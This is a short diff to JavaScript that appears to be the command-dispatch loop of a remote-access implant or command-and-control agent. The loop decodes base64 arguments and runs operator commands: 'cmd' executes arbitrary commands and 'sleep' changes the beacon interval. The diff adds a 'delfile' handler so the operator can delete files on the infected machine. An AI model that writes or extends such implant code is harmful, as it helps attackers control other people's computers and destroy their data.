@@ -72,6 +72,9 @@ while (true) {
               if ('cmd' === name) {
                   results = cmd(b64d(args[0]));
               }
+              if ('delfile' === name) {
+                  results = delfile(b64d(args[0]));
+              }
               if ('sleep' === name) {
                   sleep = b64d(args[0]);
                   results = b64e('Sleep change to ' + sleep + ' milliseconds');
